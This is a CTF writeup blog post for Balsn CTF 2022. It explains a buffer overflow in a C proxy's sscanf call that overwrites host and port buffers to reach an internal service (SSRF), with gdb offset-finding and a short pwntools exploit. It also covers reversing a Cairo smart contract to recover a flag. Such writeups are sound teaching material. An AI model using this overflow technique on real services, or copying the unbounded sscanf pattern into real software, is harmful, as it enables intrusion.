---
layout: post
title:  "Balsn CTF 2022 Writeup"
date:   2022-09-09
categories: ctf
description: from reversing cairo bytecode to buffer overflow lead to ssrf
tags: CTF
---

<img src="/images/balsnctf2022/logo.png" />

I played balsnCTF last week and solve several challenge, in this post I will only cover 
Pwn and smartcontract challenge

List Challenge:
<ul>
    <h3>PWN</h3>
    <li>Flag Market 1</li>
    <h3>SmartContract</h3>
    <li>Cairo Reverse</li>
</ul>


# Flag Market 1
<pre>
Do you love flags?
Try to buy some!
nc flag-market-us.balsnctf.com 19091 or
nc flag-market-sin.balsnctf.com 19091 or
nc flag-market-uk.balsnctf.com 19091

Note: Distributed file is in challenge Flag Market 1
https://balsnctf-challenges-2022.s3.amazonaws.com/flag_market_1/234b79b0adee52c9402019214038dce9.zip
</pre>

### Identify The Vulnerability

We were given several files, from docker file to source code and a Makefile

first I started check the `flag_market.c` which I found a buffer overflow vulnerability on `connection_handler`

{% highlight C %}
void connection_handler(int sock_fd)
{
    char request[MAX_REQ_BUF] = {};
    char method[MAX_BUF] = {};
    char path[MAX_BUF] = {};
    char port[MAX_BUF] = {};
    char host[MAX_BUF] = {};
    size_t n = 0;
    size_t reqLen = 0;

    connection_sock = sock_fd;
    signal(SIGALRM, exception_handler);
    signal(SIGABRT, exception_handler);
    alarm(TIMEOUT);

    snprintf(host, MAX_BUF, "%s", BK_HOST);
    snprintf(port, MAX_BUF, "%d", BK_PORT);

    reqLen = read_input(sock_fd, request, MAX_REQ_BUF);

    n = sscanf(request, "%s /%s HTTP/1.1", method, path); 
    if (n != 2)
        snprintf(path, MAX_BUF, "500");

    route(sock_fd, host, port, method, path, reqLen, request);

    close(sock_fd);
    exit(0);
}
{% endhighlight %}

the `sscanf()` can trigger buffer overflow since the buffer size of `request` is larger than `method` and `path` buffer, and there's no check or limitation so all the data from `request` will copied to `method` and `path` buffer 

{% highlight c %}
#define MAX_BUF 384
#define MAX_REQ_BUF 1024
{% endhighlight %}

in this situation we can overflow the buffer and overwrite the `host` and `port` which can lead to ssrf vulnerability.

next, I found that our goal is to access webservice on port `31337`
{% highlight xinetd %}
service backend-flag1
{
        disable = no
        type = UNLISTED
        wait = no
        server = /backend/run_flag1.sh
        socket_type = stream
        protocol = tcp
        user = backend
	port = 31337
        flags = IPv4 REUSE
        per_source = 5
        rlimit_cpu = 3
	rlimit_as = 64M
        nice = 18
}

{% endhighlight %}

which allow us to read our flag

{% highlight sh %}
#!/bin/bash

echo $FLAG1
{% endhighlight %}

### Setup debugging environment

in order to debug the binary, I edit a few things on `docker-compose-chal.yml`

{% highlight config %}
version: "3.5"
services:
    flag_market:
        build:
            context: ./
            dockerfile: flag_market.Dockerfile
        ports:
            - "${CHAL_PORT}:19091/tcp"

        networks:
            - flag_market_network
        security_opt:               # start changed line
            - seccomp:unconfined    # 
        cap_add:                    # 
            - SYS_PTRACE            # end of changed line

networks:
    flag_market_network:
        external: true

# CHAL_PORT=13337 docker-compose -f ./docker-compose-chal.yml -p flag_market_13337 up -d
{% endhighlight %}

next, run `deploy.sh` to install and deploy the challenge on local machine.
after `deploy.sh` executed we should have a service running on the port `13337`

<img src="/images/balsnctf2022/idle.png"/>

now, we need to install gdb on the docker container by running these command 

{% highlight sh %}
sudo docker exec -it --workdir /root --user root  flag_market_flag_market_1 bash
apt install gdb
{% endhighlight %}

so we can debug the binary on the docker it self by attaching the PID process using gdb


<img src="/images/balsnctf2022/gdb1.png"/>

now we can set breakpoint `b* route+1152`so we can determine the offset to overwrite the port and host  

<img src="/images/balsnctf2022/gdb2.png"/>

after setting up the breakpoint, we can use `pattern create` from gdb-gef to determine how long exactly to overwrite the `port` buffer and allow us to perform ssrf via buffer overflow

<img src="/images/balsnctf2022/gdb3.png"/>

as you can see from the screenshot above, we can overwrite the `port` buffer using 768 byte padding
and overwrite it with `31337` so we can access internal website. here is my exploit to perform ssrf via buffer overflow

{% highlight python %}
from pwn import *
r = remote("localhost",13337)

def solve_flag1():
    off2setPort = 768
    p = "A" * off2setPort
    p += "31337"
    r.sendline(p)    
    r.interactive()

solve_flag1()
{% endhighlight %}

# Cairo Reverse

<pre>
Simple cairo reverse

starknet-compile 0.9.1

https://balsnctf-challenges-2022.s3.amazonaws.com/cairo-reverse/1912abefd6b99c40e35a2bdaaa6f7fb2.zip
Author: ysc
</pre>

### Analysis the smartcontract file

after analysis I found that we have to reveal the censored value from contract.cairo file
{% highlight cairo %}
# Declare this file as a StarkNet contract.
%lang starknet

from starkware.cairo.common.cairo_builtins import HashBuiltin

@view
func get_flag{
    syscall_ptr : felt*,
    pedersen_ptr : HashBuiltin*,
    range_check_ptr,
}(t:felt) -> (res : felt):
    if t == /* CENSORED */:
        return (res=0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 + t*t)
    else:
        return(res=0)
    end
end
{% endhighlight %}

I use thoth to decompile the compiled json file, Thoth (pronounced "toss") is a Cairo/Starknet analyzer, disassembler & decompiler written in Python 3. Thoth's features also include the generation of the call graph and control-flow graph (CFG) of a given Cairo/Starknet compilation artifact. you can install thoth by running these command

{% highlight sh %}
sudo apt install graphviz
git clone https://github.com/FuzzingLabs/thoth && cd thoth
pip install .
thoth -h
{% endhighlight %}

after analysis the cairo bytecode and reading the `get_flag()` function, I found the secret value 

<img src="/images/balsnctf2022/cairo1.png"/>

now we can replicate the smartcontract source code using python to get the flag

{% highlight python %}
>>> hex(0x42414c534e7b6f032fa620b5c520ff47733c3723ebc79890c26af4 + 0x1d6e61c2969f782ede8c3 * 0x1d6e61c2969f782ede8c3)
'0x42414c534e7b726561645f646174615f66726f6d5f636169726f7d'
>>> print(bytes.fromhex('42414c534e7b726561645f646174615f66726f6d5f636169726f7d').decode('utf-8'))
BALSN{read_data_from_cairo}
{% endhighlight %}

